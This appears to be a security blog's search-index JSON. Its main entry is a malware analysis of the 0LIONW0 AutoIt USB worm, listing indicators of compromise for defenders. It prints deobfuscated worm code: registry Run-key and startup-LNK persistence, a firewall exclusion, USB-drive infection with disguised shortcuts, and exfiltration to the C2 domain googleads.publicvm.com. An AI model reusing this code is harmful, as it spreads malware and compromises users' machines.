{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Brain You the Blog","text":"<p>Share any security stuff!</p>"},{"location":"about/","title":"About me","text":"<p>Hi, this is Brain You, a security partitioner specialized in Security Operations.</p> <p>This blog is intended to share my personal researches, views &amp; ideas on security operations, etc - for ideas exchange, as well as contributing to the industry.</p> <p>If you found my stuff useful and interesting, feel free to contact me via LinkedIn:</p> <ul> <li>Brian Yau | LinkedIn</li> </ul>"},{"location":"tags/","title":"Tags","text":""},{"location":"tags/#adcs","title":"ADCS","text":"<ul> <li>202309 - Altered Security CESP-ADCS Review</li> </ul>"},{"location":"tags/#autoit","title":"AutoIt","text":"<ul> <li>202306 - AutoIt3 based USB Malware: The 0LIONW0 Worm (aka AutoIt.OTORUN.AC)</li> </ul>"},{"location":"tags/#certification","title":"Certification","text":"<ul> <li>202309 - Altered Security CESP-ADCS Review</li> </ul>"},{"location":"tags/#crypto-stealer","title":"Crypto Stealer","text":"<ul> <li>202310 - Extract &amp; Extract &amp; Extract</li> </ul>"},{"location":"tags/#exam","title":"Exam","text":"<ul> <li>202309 - Altered Security CESP-ADCS Review</li> </ul>"},{"location":"tags/#javascript","title":"JavaScript","text":"<ul> <li>202311 - JavaScript Deobfuscation &amp; conhost.exe LOLBAS</li> </ul>"},{"location":"tags/#redteaming","title":"RedTeaming","text":"<ul> <li>202309 - Altered Security CESP-ADCS Review</li> </ul>"},{"location":"tags/#stealer","title":"Stealer","text":"<ul> <li>202310 - Extract &amp; Extract &amp; Extract</li> </ul>"},{"location":"tags/#usb-malware","title":"USB Malware","text":"<ul> <li>202306 - AutoIt3 based USB Malware: The 0LIONW0 Worm (aka AutoIt.OTORUN.AC)</li> </ul>"},{"location":"tags/#worming","title":"Worming","text":"<ul> <li>202306 - AutoIt3 based USB Malware: The 0LIONW0 Worm (aka AutoIt.OTORUN.AC)</li> </ul>"},{"location":"tags/#dfir","title":"dfir","text":"<ul> <li>Powershell Obfuscation 1: Formatter</li> </ul>"},{"location":"tags/#malware-analysis","title":"malware analysis","text":"<ul> <li>Powershell Obfuscation 1: Formatter</li> <li>202311 - JavaScript Deobfuscation &amp; conhost.exe LOLBAS</li> </ul>"},{"location":"tags/#powershell","title":"powershell","text":"<ul> <li>Powershell Obfuscation 1: Formatter</li> </ul>"},{"location":"blogs/202306-USBMalware/","title":"202306 - AutoIt3 based USB Malware: The 0LIONW0 Worm (aka AutoIt.OTORUN.AC)","text":"","tags":["AutoIt","USB Malware","Worming"]},{"location":"blogs/202306-USBMalware/#overview","title":"Overview","text":"<p>Recently I have come across with an interesting USB infection based on AutoIt3. In the case, I reversed the compiled script to dig out the intention, analyzed the C2 commands and indicators of compromise. </p> <p>Using AutoIt as Malware is quite an old technique - as old as 2012 with reference to a McAfee blog. However as a case study, it is still valuable to find out how it can be leveraged, and as a analyst how you can dig deeper to get a better understanding.</p> <p>The exact same malicious <code>.a3x</code> was tracked as earliest as in 2019, with reference to the VirusTotal sample and Worm.AutoIt.OTORUN.AC | threat encyclopedia from TrendMicro - still having victims in 2023 due to its worming capability!</p> <p></p>","tags":["AutoIt","USB Malware","Worming"]},{"location":"blogs/202306-USBMalware/#the-samples-microsoftsecurityexe-microsofta3x","title":"The samples - MicrosoftSecurity.exe &amp; Microsoft.a3x","text":"<p>A sample of the malware was obtained in an infected machine. As a contextual background, the infected machine had been triaged and was quickly identified that the user inserted a USB thumb right before the machine started some suspicious activities.</p> <p>Getting the sample, let's check some general information:</p> <p></p> <p></p> <ul> <li>On the Description, it gives us an indication of AutoIt. Indeed, checking the filehash on VirusTotal, it is indeed a copy of AutoIt.</li> </ul> <p>With this file - it is also expected that there will be a <code>.a3x</code> file - the AutoIt3 compiled script. Generally speaking, the malware can be invoked by running the following command or other equivalent:</p> <pre><code>MicrosoftSecurity.exe something.a3x\n</code></pre> <p>Checking the file system, indeed a sample of <code>.a3x</code> script was found as <code>Microsoft.a3x</code>. The script sample can be found in VirusTotal.</p> <p></p>","tags":["AutoIt","USB Malware","Worming"]},{"location":"blogs/202306-USBMalware/#capabilities-summary","title":"Capabilities Summary","text":"<ol> <li>Infection: Through clicking the weaponized LNK files / inserting an autorun infected USB drive</li> <li>Worming activity: The malware will spread by infecting all active USB drives on the victim machines</li> <li>Persistence capabilities: <ul> <li>Add multiple <code>RUN</code> keys in <code>HKLM</code> and <code>HKCU</code></li> <li>Add a LNK file to Windows startup folder to run AutoIt with the malicious script</li> </ul> </li> <li>C2:<ul> <li>C2 server: <code>googleads.publicvm.com:223</code> without encryption</li> <li><code>DL</code>: Download a file from an arbitrary URL and execute it in %TEMP%</li> <li><code>un</code>: Remove the persistence and remove the entry for allowing AutoIt traffic to pass through</li> <li><code>cmd</code>: Run an arbitrary CMD command</li> </ul> </li> <li>Exfiltration: The malware will exfiltrate the host information, including: hostname, OS version, OS architecture, Anti-Virus in use, current user name, etc.</li> </ol>","tags":["AutoIt","USB Malware","Worming"]},{"location":"blogs/202306-USBMalware/#de-compiling-the-autoit3-script","title":"De-compiling the AutoIt3 script","text":"<p>Exe2Aut was used to decompile the script. It is a GUI application and the process of decompiling is strictforward - simply open the PE file on Exe2Aut and choose the compiled <code>.a3x</code> file. You will get the decompiled script:</p> <p></p> <p></p>","tags":["AutoIt","USB Malware","Worming"]},{"location":"blogs/202306-USBMalware/#deobfuscation","title":"Deobfuscation","text":"<p>The decompiled script itself is highly obfuscated - all the variables are named with random characters and the values assigned are obfuscated using many <code>String()</code> and <code>ChrW()</code> functions.</p> <p>However, the obfuscation logic is not too complex - it is just a matter of time to deobfuscate with <code>Find &amp; Replace</code> magic - may possibly automate somehow. In this case, I manually got the job done with the help of OnlineGDB - since the script works almost exactly the same as VB scripts.</p> <p>During the renaming, we repetitively rename variables. To make it easier to reference, I prefer to use the naming convension <code>&lt;type&gt;_&lt;value&gt;</code> - for example, <code>string_Microsoft</code>. For functions, we will use <code>funct_&lt;usage&gt;</code> for the same reason.</p> <p></p>","tags":["AutoIt","USB Malware","Worming"]},{"location":"blogs/202306-USBMalware/#analysis","title":"Analysis","text":"<p>After the deobfuscation, we get the deobfuscated script - note that it is not fully functional nor fully deobfuscated - the objective is to get enough information as we can respond fully to scope &amp; contain the incident at hand:</p> <ol> <li>Intentions &amp; capabilities</li> <li>Malware logic</li> </ol> <p></p>","tags":["AutoIt","USB Malware","Worming"]},{"location":"blogs/202306-USBMalware/#analysis-1-global-variables","title":"Analysis 1: Global Variables","text":"<p>In the declared global variables, we may see some key information which can be used as indicators of compromise (IOCs):</p> <pre><code>Global $susp_domain_1 = \"googleads.publicvm.com\"\nGlobal $string_C:\\MicrosoftSecurity = \"C:\\MicrosoftSecurity\"\nGlobal $susp_file_lnk_1 = \"MicrosoftCMD.lnk\"\nGlobal $string_microsoft = \"Microsoft\"\nGlobal $string_microsoftsecurity = \"Microsoft Security\"\nGlobal $string_microsoftsecurity_exe = \"MicrosoftSecurity.exe\"\nGlobal $string_vbs = \"vbs\"\nLocal $string_zeus = \"Zeus\"\n$string_zeus &amp;= \"_\" &amp; Hex(DriveGetSerial(@HomeDrive))\nGlobal $string_0.4x = \"0.4x\"\nIf FileExists(\"C:\\MicrosoftSecurity/Microsoft.lnk\") Then\n    $string_0.4x = \"0.4x Usb\"\nEndIf\n$string_Microsoft.a3x = \"Microsoft.a3x\"\n$string_0LIONW0 = \"0LIONW0\"\n</code></pre> <p>Network indicators:</p> <ul> <li>Suspected C2 domain: <code>googleads.publicvm.com</code></li> </ul> <p>File system indicators:</p> <ul> <li>Existence of the folder: <code>C:\\MicrosoftSecurity</code></li> <li>Existence of the LNK file: <code>MicrosoftCMD.lnk</code> / <code>C:\\MicrosoftSecurity/Microsoft.lnk</code></li> </ul> <p>Malware unique identifier string: <code>0LIONW0</code></p> <p>Later we will see how the malware uses the above discovered strings.</p> <p></p>","tags":["AutoIt","USB Malware","Worming"]},{"location":"blogs/202306-USBMalware/#analysis-2-the-first-if-condition","title":"Analysis 2: The first IF-condition","text":"<pre><code>If @ScriptDir &lt;&gt; $string_C:\\MicrosoftSecurity AND $int_4 = 4 Then\n    If $string_vbs = \"exe\" Then\n        FileCopy(@AutoItExe, $jbwklcjcaewtgpgszopzykmpwnarnhcrstdgofpsjelsafyvywtx, 9)\n        Run($jbwklcjcaewtgpgszopzykmpwnarnhcrstdgofpsjelsafyvywtx)\n    Else\n        DirCopy(@ScriptDir, \"C:\\Microsoft\", 1)\n        ShellExecute(\"C:\\MicrosoftSecurity\\MicrosoftSecurity.exe C:\\MicrosoftSecurity\\Microsoft.a3x\" , @SW_HIDE)\n        ShellExecute(\"cmd.exe /c start C:\\MicrosoftSecurity/MicrosoftSecurity.exe C:\\MicrosoftSecurity\\Microsoft.a3x\", \"\", \"\", @SW_HIDE)\n    EndIf\n    FileSetAttrib(\"C:\\MicrosoftSecurity\", \"+RSH\") // Read, System file, Hidden\n    Exit\nEndIf\n</code></pre> <ul> <li><code>$string_vbs = \"exe\"</code> will always return <code>false</code> since it is statically assigned as <code>vbs</code> - in so the Else branch will run</li> <li>It first copies all files in the running script directory to <code>C:\\MicrosoftSecurity</code></li> <li>Then a <code>cmd.exe</code> will be launched to run AutoIt3 with the compiled script (twice - could be for fault-tolerance)</li> <li>For files hiding, it will also set the directory to be 'READ-ONLY', 'SYSTEM' and 'HIDDEN'</li> </ul>","tags":["AutoIt","USB Malware","Worming"]},{"location":"blogs/202306-USBMalware/#analysis-3-function-invoked-reset","title":"Analysis 3: Function invoked - Reset","text":"<p>Next, the script invokes the following function:</p> <pre><code>setFirewallExclusion_DeleteLNK_RemovePersistenceRegKey()\n</code></pre> <p>The function is broken down as follows:</p> <pre><code>    EnvSet(\"SEE_MASK_NOZONECHECKS\")\n    ShellExecute(\"netsh \" &amp; @AutoItExe &amp; \" \" &amp; \"MicrosoftSecurity.exe\" &amp; \"\" ENABLE\"\", \"\", \"\", @SW_HIDE)\n    If @error Then\n    EndIf\n</code></pre> <ul> <li>Set an environment variable as an \"infected flag\"</li> <li>Run <code>netsh</code> to add firewall exclusion for <code>MicrosoftSecurity.exe</code></li> </ul> <pre><code>    $string_C:\\GoogleChrome = \"C:\\GoogleChrome\"\n    $string_C:\\MozillaFirefox = \"C:\\MozillaFirefox\"\n    ProcessClose(\"GoogleChrome.exe\")\n    ProcessClose(\"Mozilla.exe\")\n    Sleep(999)\n    FileDelete(\"C:\\GoogleChrome\\GoogleChrome.a3x\")\n    FileDelete(\"C:\\GoogleChrome\\GoogleChrome.exe\")\n    FileDelete(\"C:\\GoogleChrome\\GoogleChrome.lnk\")\n    FileDelete(\"C:\\GoogleChrome\\My Pictures.lnk\")\n    FileDelete(\"C:\\GoogleChrome\\GoogleUpdate.lnk\")\n    FileDelete(\"C:\\GoogleChrome\\My Music.lnk\")\n    FileDelete(\"C:\\GoogleChrome\\WindowsUpdate.lnk\")\n    If ProcessExists(\"Mozilla.exe\") Then\n        ProcessClose(\"Mozilla.exe\")\n    EndIf\n    FileDelete(\"C:\\GoogleChrome\\Mozilla.exe\")\n    FileDelete(\"C:\\GoogleChrome\\Mozilla.vbs\")\n    FileDelete(\"C:\\GoogleChrome\\Mozilla.vb\")\n    FileDelete(\"C:\\MozillaFirefox\\GoogleChrome.a3x\")\n    FileDelete(\"C:\\MozillaFirefox\\GoogleChrome.exe\")\n    FileDelete(\"C:\\MozillaFirefox\\GoogleChrome.lnk\")\n    FileDelete(\"C:\\MozillaFirefox\\My Pictures.lnk\")\n    FileDelete(\"C:\\MozillaFirefox\\GoogleUpdate.lnk\")\n    FileDelete(\"C:\\MozillaFirefox\\My Music.lnk\")\n    FileDelete(\"C:\\MozillaFirefox\\WindowsUpdate.lnk\")\n    If ProcessExists(\"Mozilla.exe\") Then\n        ProcessClose(\"Mozilla.exe\")\n    EndIf\n    FileDelete(\"C:\\MozillaFirefox\\Mozilla.exe\")\n    FileDelete(\"C:\\MozillaFirefox\\Mozilla.vbs\")\n    FileDelete(\"C:\\MozillaFirefox\\Mozilla.vb\")\n    RegDelete(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"JavaUpdate\")\n    RegDelete(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"AdopeUpdate\")\n    RegDelete(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"NewJavaInstall\")\n    RegDelete(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"AdopeFlash\")\n    RegDelete(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"WindowsUpdate.lnk\")\n    RegDelete(\"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"WindowsUpdate.lnk\")\n    RegDelete(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"GoogleChrome.exe\")\n    RegDelete(\"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"GoogleChrome.exe\")\n    RegDelete(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Google Chrome\")\n    RegDelete(\"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Google Chrome\")\nEndFunc\n</code></pre> <ul> <li>The script terminates <code>GoogleChrome.exe</code> and <code>Mozilla.exe</code></li> <li>Then it removes specific <code>exe</code> / <code>vbs</code> / <code>a3x</code> / <code>lnk</code> residing in the suspicious folder paths:<ul> <li><code>C:\\GoogleChrome</code></li> <li><code>C:\\MozillaFirefox</code></li> </ul> </li> <li>Finally, some HKCU and HKLM run keys are removed, with the key name being legit processes like <code>JavaUpdate</code>, <code>AdopeFlash</code> (typo <code>Adobe</code>), <code>WindowsUpdate</code>, etc - in attempt to hide in plain sight</li> </ul> <p>Note these can all be used as indicators of compromise.</p> <p></p>","tags":["AutoIt","USB Malware","Worming"]},{"location":"blogs/202306-USBMalware/#analysis-4-function-to-set-things-up","title":"Analysis 4: Function to set things up","text":"<p>Then the function <code>RunAutoItScript_SetPersistenceKeys_CreateStartupCommonLNK()</code> is invoked.</p> <pre><code>Func RunAutoItScript_SetPersistenceKeys_CreateStartupCommonLNK()\n    $execute_MicrosoftSecurity.exe /AutoIt3ExecuteScript Microsoft.a3x = \"@ScriptDir\\MicrosoftSecurity.exe /AutoIt3ExecuteScript @ScriptDir\\Microsoft.a3x\"\n    $string_MicrosoftCMD = StringRegExpReplace(\"MicrosoftCMD.lnk\", \"\\.[^\\.\\\\/]*$\", \"\")  // Should be outputting \"MicrosoftCMD\"\n    $execute_MicrosoftCMD Microsoft.a3x = \"@ScriptDir\\MicrosoftSecurity.exe @ScriptDir\\Microsoft.a3x\"\n    $string_@ScriptDir\\MicrosoftCMD.lnk = \"@ScriptDir\\MicrosoftCMD.lnk\"\n</code></pre> <ul> <li>The function starts with declaring some variables for static strings and commands for running AutoIt3 with the script</li> </ul> <pre><code>    If RegRead(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Microsoft Security\") &lt;&gt; \"@ScriptDir\\MicrosoftCMD.lnk\" Then\n        RegWrite(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Microsoft Security\", \"REG_SZ\", \"@ScriptDir\\MicrosoftUpdate.lnk\")\n    EndIf\n    If RegRead(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Microsoft Security\") &lt;&gt; \"@ScriptDir\\MicrosoftCMD.lnk\" Then\n        RegWrite(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, \"Microsoft Security\", \"REG_SZ\", \"@ScriptDir\\MicrosoftUpdate.lnk\")\n    EndIf\n    If RegRead(HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Microsoft Office\") &lt;&gt; \"@ScriptDir\\MicrosoftCMD.lnk\" Then\n        RegWrite(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", Microsoft Office\", \"REG_SZ\", \"@ScriptDir\\MicrosoftUpdate.lnk\")\n    EndIf\n    If RegRead(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Cortana\") &lt;&gt; \"@ScriptDir\\MicrosoftCMD.lnk\" Then\n        RegWrite(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Cortana\", \"REG_SZ\", \"@ScriptDir\\MicrosoftUpdate.lnk\")\n    EndIf\n    If RegRead(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"HDAudio\") &lt;&gt; $string_@ScriptDir\\MicrosoftCMD.lnk Then\n        RegWrite(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"HDAudio\", \"REG_SZ\", \"@ScriptDir\\MicrosoftSecurity.exe /AutoIt3ExecuteScript @ScriptDir\\Microsoft.a3x\")\n    EndIf\n    If RegRead(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"PrintDriver) &lt;&gt; \"@ScriptDir\\MicrosoftCMD.lnk\" Then\n        RegWrite(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"PrintDriver\", \"REG_SZ\", \"@ScriptDir\\MicrosoftSecurity.exe /AutoIt3ExecuteScript @ScriptDir\\Microsoft.a3x\")\n    EndIf\n    If FileExists(\"@StartupCommonDir\\MicrosoftCMD.lnk) = False Then\n        FileCreateShortcut(\"cmd.exe\", \"@StartupCommonDir\\Microsoft Security.lnk\", \"\", \"/c start @ScriptDir\\MicrosoftSecurity.exe @ScriptDir\\Microsoft.a3x &amp; exit\")\n    EndIf\n    If FileExists(\"@StartupCommonDir\\MicrosoftUpdate.lnk\") = False Then\n        FileCreateShortcut(\"@ScriptDir\\MicrosoftSecurity.exe\", \"@StartupCommonDir\\MicrosoftUpdate.lnk\", \"\", \"/AutoIt3ExecuteScript @ScriptDir\\Microsoft.a3x\")\n    EndIf\n    If @error Then\n    EndIf\n</code></pre> <ul> <li>Some additional files and keys which does not exist in Analysis 43 will be created in these if-branches.</li> <li>Also, the above files / reg keys can be IOCs as well.</li> </ul> <p></p>","tags":["AutoIt","USB Malware","Worming"]},{"location":"blogs/202306-USBMalware/#analysis-5-setting-things-up-2","title":"Analysis 5: Setting things up 2","text":"<p>Then the function <code>RunAutoItScript_SetPersistenceKeys_CreateStartupCommonLNK()</code> is invoked. This reason to invoke this is similar to Analysis 4.</p> <pre><code>Func RunAutoItScript_SetPersistenceKeys_CreateStartupCommonLNK()\n    $execute_MicrosoftSecurity.exe /AutoIt3ExecuteScript Microsoft.a3x = \"@ScriptDir\\MicrosoftSecurity.exe /AutoIt3ExecuteScript @ScriptDir\\Microsoft.a3x\"\n    $string_MicrosoftCMD = StringRegExpReplace(\"MicrosoftCMD.lnk\", \"\\.[^\\.\\\\/]*$\", \"\")  // Should be outputting \"MicrosoftCMD\"\n    $execute_MicrosoftCMD Microsoft.a3x = \"@ScriptDir\\MicrosoftSecurity.exe @ScriptDir\\Microsoft.a3x\"\n    $string_@ScriptDir\\MicrosoftCMD.lnk = \"@ScriptDir\\MicrosoftCMD.lnk\"\n    If RegRead(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Microsoft Security\") &lt;&gt; \"@ScriptDir\\MicrosoftCMD.lnk\" Then\n        RegWrite(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Microsoft Security\", \"REG_SZ\", \"@ScriptDir\\MicrosoftUpdate.lnk\")\n    EndIf\n    If RegRead(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Microsoft Security\") &lt;&gt; \"@ScriptDir\\MicrosoftCMD.lnk\" Then\n        RegWrite(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, \"Microsoft Security\", \"REG_SZ\", \"@ScriptDir\\MicrosoftUpdate.lnk\")\n    EndIf\n    If RegRead(HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Microsoft Office\") &lt;&gt; \"@ScriptDir\\MicrosoftCMD.lnk\" Then\n        RegWrite(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", Microsoft Office\", \"REG_SZ\", \"@ScriptDir\\MicrosoftUpdate.lnk\")\n    EndIf\n    If RegRead(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Cortana\")) &lt;&gt; \"@ScriptDir\\MicrosoftCMD.lnk\" Then\n        RegWrite(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Cortana\", \"REG_SZ\", \"@ScriptDir\\MicrosoftUpdate.lnk\")\n    EndIf\n    If RegRead(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"HDAudio\") &lt;&gt; $string_@ScriptDir\\MicrosoftCMD.lnk Then\n        RegWrite(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"HDAudio\", \"REG_SZ\", \"@ScriptDir\\MicrosoftSecurity.exe /AutoIt3ExecuteScript @ScriptDir\\Microsoft.a3x\")\n    EndIf\n    If RegRead(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"PrintDriver) &lt;&gt; \"@ScriptDir\\MicrosoftCMD.lnk\" Then\n        RegWrite(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"PrintDriver\", \"REG_SZ\", \"@ScriptDir\\MicrosoftSecurity.exe /AutoIt3ExecuteScript @ScriptDir\\Microsoft.a3x\")\n    EndIf\n    If FileExists(\"@StartupCommonDir\\MicrosoftCMD.lnk) = False Then\n        FileCreateShortcut(\"cmd.exe\", \"@StartupCommonDir\\Microsoft Security.lnk\", \"\", \"/c start @ScriptDir\\MicrosoftSecurity.exe @ScriptDir\\Microsoft.a3x &amp; exit\")\n    EndIf\n    If FileExists(\"@StartupCommonDir\\MicrosoftUpdate.lnk\") = False Then\n        FileCreateShortcut(\"@ScriptDir\\MicrosoftSecurity.exe\", \"@StartupCommonDir\\MicrosoftUpdate.lnk\", \"\", \"/AutoIt3ExecuteScript @ScriptDir\\Microsoft.a3x\")\n    EndIf\n    If @error Then\n    EndIf\nEndFunc\n</code></pre> <p></p>","tags":["AutoIt","USB Malware","Worming"]},{"location":"blogs/202306-USBMalware/#analysis-6-create-malicious-lnk-files-for-running-the-autoit-script","title":"Analysis 6: Create malicious LNK files for running the AutoIt script","text":"<p>Then the function <code>CreateScriptDirLNKFiles()</code> is invoked.</p> <pre><code>Func CreateScriptDirLNKFiles()\n    If FileExists(\"@ScriptDir\\MicrosoftUpdate.lnk\") = False Then\n        FileCreateShortcut(\"cmd.exe\", \"@ScriptDir\\MicrosoftUpdate.lnk\", \" \", \"/c start @ScriptDir\\MicrosoftSecurity.exe @ScriptDir\\Microsoft.a3x &amp; exit\")\n    EndIf\n    If FileExists(\"@ScriptDir\\MicrosoftSecurity.lnk\") = False Then\n        FileCreateShortcut(\"@ScriptDir\\MicrosoftSecurity.exe\", \"@ScriptDir\\MicrosoftUpdate.lnk\", \" \", \"/AutoIt3ExecuteScript @ScriptDir\\Microsoft.a3x\")\n    EndIf\nEndFunc\n</code></pre> <ul> <li>This reveals the purpose of the <code>LNK</code> files above - invoke AutoIt3 to run the malicious script</li> <li>It simply checked if the above LNK files exist the current running script location and create if not</li> <li>Of course the naming is misleading!</li> </ul> <p></p>","tags":["AutoIt","USB Malware","Worming"]},{"location":"blogs/202306-USBMalware/#analysis-7-infecting-all-usb-storages","title":"Analysis 7: Infecting all USB storages","text":"<p>The <code>UnsetShowhiddenInfectAllUSBwithLNKFiles(\"ALL\")</code> function is intended to infect all USB devices used in the current machine.</p> <pre><code>Func UnsetShowhiddenInfectAllUSBwithLNKFiles($string_REMOVEABLE = \"REMOVABLE\")\n    $string_Microsoft\\MicrosoftSecurity.exe  /AutoIt3ExecuteScript  ..\\Microsoft\\Microsoft.a3x = \"Microsoft\\MicrosoftSecurity.exe  /AutoIt3ExecuteScript  ..\\Microsoft\\Microsoft.a3x\"\n    RegWrite(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\", \"ShowSuperHidden\", 0)\n    $array_removable_drives = DriveGetDrive(\"REMOVABLE\")\n\n    // Loop through all active REMOVABLE Drives, check if \"x:\\Microsoft\" exists, if not make it\n    If IsArray($array_removable_drives) Then\n        For $i = 1 To $array_removable_drives[0]\n            If DriveStatus($array_removable_drives[$i]) = \"READY\" Then\n                If DriveSpaceFree($array_removable_drives[$i]) &gt; 10 Then\n                    If FileExists($array_removable_drives[$i] &amp; \"\\Microsoft\") = 0 Then FileDelete($array_removable_drives[$i] &amp; \"\\Microsoft\")\n                    DirCopy(@ScriptDir, $array_removable_drives[$i] &amp; aString(\"\\\") &amp; \"Microsoft\", 1)\n                    FileSetAttrib($array_removable_drives[$i] &amp; \"\\Microsoft\", \"+RSH\")\n                    Local $varFirstFile = FileFindFirstFile($array_removable_drives[$i] &amp; \"\\*.*\")\n                    While 1\n                        Dim $varNextFile = FileFindNextFile($varFirstFile)\n                        If $varNextFile = \"\" Then ExitLoop\n                        If StringInStr(FileGetAttrib($array_removable_drives[$i] &amp; aString(\"\\\") &amp; $varNextFile), \"D\") AND ($varNextFile &lt;&gt; \".\" OR $varNextFile &lt;&gt; \"..\") Then\n                            FileCreateShortcut(\"cmd.exe\", \"$array_removable_drives[$i]\\$varNextFile\\$varNextFile\", \"\", \"/c start ..\\Microsoft\\MicrosoftSecurity.exe\"  /AutoIt3ExecuteScript  ..\\Microsoft\\Microsoft.a3x &amp; explorer  %CD% exit\", \"\", \"%windir%\\system32\\SHELL32.dll\", \"\", 3, @SW_SHOWMINNOACTIVE)\n                            FileCreateShortcut(\"cmd.exe\", \"$array_removable_drives[$i]\\$varNextFile\\Music\", \"\", \"/c start ..\\Microsoft\\MicrosoftSecurity.exe  /AutoIt3ExecuteScript  ..\\Microsoft\\Microsoft.a3x &amp; explorer  %CD%  &amp; exit\", \"\",  \"%windir%\\system32\\SHELL32.dll\", \"\", 3, @SW_SHOWMINNOACTIVE)\n                            FileCreateShortcut(\"cmd.exe\", \"$array_removable_drives[$i]\\$varNextFile\\Pictures\"), \"\", /c start ..\\Microsoft\\MicrosoftSecurity.exe  /AutoIt3ExecuteScript  ..\\Microsoft\\Microsoft.a3x &amp; explorer  %CD% &amp; exit\", \"\", \"%windir%\\system32\\SHELL32.dll\", \"\", 3, @SW_SHOWMINNOACTIVE)\n                            FileCreateShortcut(\"cmd.exe\", \"$array_removable_drives[$i]\\$varNextFile\\Reports\"), \"\", /c start ..\\Microsoft\\MicrosoftSecurity.exe  /AutoIt3ExecuteScript  ..\\Microsoft\\Microsoft.a3x &amp; explorer  %CD% &amp; exit\", \"\", \"%windir%\\system32\\SHELL32.dll\", \"\", 3, @SW_SHOWMINNOACTIVE)\n                            FileCreateShortcut(\"cmd.exe\", \"$array_removable_drives[$i]\\$varNextFile\\Statements\"), \"\", /c start ..\\Microsoft\\MicrosoftSecurity.exe  /AutoIt3ExecuteScript  ..\\Microsoft\\Microsoft.a3x &amp; explorer  %CD% &amp; exit\", \"\", \"%windir%\\system32\\SHELL32.dll\", \"\", 3, @SW_SHOWMINNOACTIVE)\n                        EndIf\n                        Sleep(40)\n                    WEnd\n                EndIf\n            EndIf\n        Next\n    EndIf\n    If @error Then\n    EndIf\nEndFunc\n</code></pre> <ul> <li>It first reset the Explorer.exe preference of \"show hidden files\" so the user may not notice the hidden folders / files when browsing</li> <li>Then it loops through all USB storage and see if there is a folder in root called <code>Microsoft</code>. If not, create a hidden one and add some misleading shortcut files for, again invoking the malicious AutoIt script.</li> </ul> <p></p>","tags":["AutoIt","USB Malware","Worming"]},{"location":"blogs/202306-USBMalware/#analysis-8-create-malicious-lnk-files-with-directories-in-other-usb-devices-and-notify-c2","title":"Analysis 8: Create malicious LNK files with directories in other USB devices and notify C2","text":"<p>Then the script invokes <code>CreateDocuments_Downloads_LNK_CreateDir_Reports|Statements|My Pictures|My Videos|My Pictures|My Videos()</code>.</p> <p>This function works similarly to Analysis 7.</p> <p>After the creation, it notifies the C2 of successfully spreading the malware to other USB devices:</p> <pre><code>                If FileExists(\"$array_RemovableDrives[$i]\\My Videos\") = False Then\n                    DirCreate(\"$array_RemovableDrives[$i]\\My Videos\")\n                    C2Exfiltrate(\"MSG0LIONW0 Spreading !!\")\n                EndIf\n</code></pre> <p>The function <code>C2Exfiltrate()</code> simply twists a payload a bit and sends to TCP message to the C2 server. Note the C2 message <code>MSG0LIONW0 Spreading !!</code> can be used for IDS detection.</p> <p></p>","tags":["AutoIt","USB Malware","Worming"]},{"location":"blogs/202306-USBMalware/#analysis-9-the-main-function-while-loop","title":"Analysis 9: The main function while-loop","text":"<p>First, when the script is run in the first time, the script invokes 2 functions to make sure the initialization has been performed; it will perform again after 4 iterations.</p> 